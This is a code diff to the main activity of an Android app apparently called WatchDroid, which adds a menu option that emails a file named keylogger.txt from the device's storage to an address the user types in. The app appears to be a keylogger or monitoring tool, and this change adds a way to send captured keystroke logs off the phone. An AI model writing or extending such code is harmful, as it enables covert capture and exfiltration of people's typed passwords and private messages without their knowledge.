@@ -3,8 +3,10 @@ package com.watchdroid;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.DialogInterface;
+import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.support.design.widget.TabLayout;
 import android.support.v4.app.Fragment;
 import android.support.v4.view.ViewPager;
@@ -12,12 +14,15 @@ import android.support.v7.app.AlertDialog;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.support.v7.widget.Toolbar;
+import android.view.LayoutInflater;
 import android.view.Menu;
 import android.view.MenuItem;
+import android.view.View;
+import android.widget.EditText;
 import android.widget.Toast;
-
 import com.arx_era.watchdroid.R;
 
+import java.io.File;
 import java.util.Random;
 
 public class MainActivity extends AppCompatActivity implements ViewPager.OnPageChangeListener {
@@ -26,6 +31,7 @@ public class MainActivity extends AppCompatActivity implements ViewPager.OnPageC
     private TabLayout tabLayout;
     private ViewPager viewPager;
     ViewPagerAdapter mAdapterViewPager;
+    Context context=this;
 
     private static final Random random = new Random();
     @Override
@@ -75,6 +81,38 @@ public class MainActivity extends AppCompatActivity implements ViewPager.OnPageC
                 String[] toastMessages = new String[]{"Thank You", "We appreciate your love", "Please live a like"};
                 int randomMsgIndex = random.nextInt(toastMessages.length - 1);
                 Toast.makeText(getApplicationContext(), toastMessages[randomMsgIndex], Toast.LENGTH_SHORT).show();
+                break;
+            case R.id.mail:
+
+                LayoutInflater li = LayoutInflater.from(context);
+                View promptsView = li.inflate(R.layout.sent_mail, null);
+
+                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
+                        context);
+
+                // set prompts.xml to alertdialog builder
+                alertDialogBuilder.setView(promptsView);
+
+                final EditText stremail = (EditText) promptsView
+                        .findViewById(R.id.emailid);
+
+                alertDialogBuilder
+                        .setCancelable(false)
+                        .setPositiveButton("Send Mail",
+                                new DialogInterface.OnClickListener() {
+                                    public void onClick(DialogInterface dialog,int id) {
+                                        String email=stremail.getText().toString();
+                                        Intent emailIntent = new Intent(android.content.Intent.ACTION_SEND);
+                                        emailIntent.setType("text/html");
+                                        emailIntent.putExtra(Intent.EXTRA_EMAIL  , new String[]{ email});
+                                        emailIntent.putExtra(Intent.EXTRA_SUBJECT, "Log file from WatchDroid");
+                                        emailIntent.putExtra(Intent.EXTRA_TEXT   , "Log file");
+                                        emailIntent.putExtra(Intent.EXTRA_STREAM, Uri.fromFile(new File("/sdcard/Android/data/arx_era/keylogger.txt")));
+                                        emailIntent.setType("text/plain");
+
+                                        startActivity(emailIntent);
+                                    }
+                                }).create().show();
                 break;
         }
         return super.onOptionsItemSelected(item);
